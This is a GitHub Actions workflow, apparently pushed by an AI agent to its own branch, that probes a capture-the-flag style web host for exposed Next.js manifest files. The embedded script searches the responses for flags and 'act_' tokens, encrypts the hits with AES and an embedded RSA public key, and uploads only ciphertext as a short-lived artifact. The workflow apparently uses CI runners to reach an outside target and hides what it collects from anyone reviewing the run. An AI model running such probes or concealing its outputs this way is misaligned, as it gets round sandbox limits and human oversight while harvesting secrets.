name: launchlet-part3-nextmanifests
on:
  push:
    branches: [agent/launchlet-part3-nextmanifests-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Probe standard build/runtime manifests and encrypt hits
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
          names=['routes-manifest.json','app-paths-manifest.json','middleware-manifest.json','prerender-manifest.json','required-server-files.json','functions-config-manifest.json','server-reference-manifest.js','server-reference-manifest.json','build-manifest.js','build-manifest.json','app-build-manifest.json','pages-manifest.json','font-manifest.json','react-loadable-manifest.json','server-functions-manifest.json','server-actions-manifest.json','action-manifest.json','server-action-manifest.json','deployment-manifest.json','preview-manifest.json']
          roots=['/assets/','/static/','/_next/server/','/_next/static/','/_next/','/server/']
          res=[]
          for root,name in itertools.product(roots,names):
            p=root+name
            try:r=requests.get(base+p,headers={'X-Launchlet-Preview':'launchlet-demo-board','Accept':'*/*'},timeout=6,allow_redirects=False)
            except Exception:continue
            if not (r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n')):
              item={'path':p,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(item)
              flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
              if flags or ('act_' in r.text and 'act_6f4b9a2c1d0e8a71' not in r.text):
                (out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-nextmanifests-encrypted
          path: artifact/
          retention-days: 1
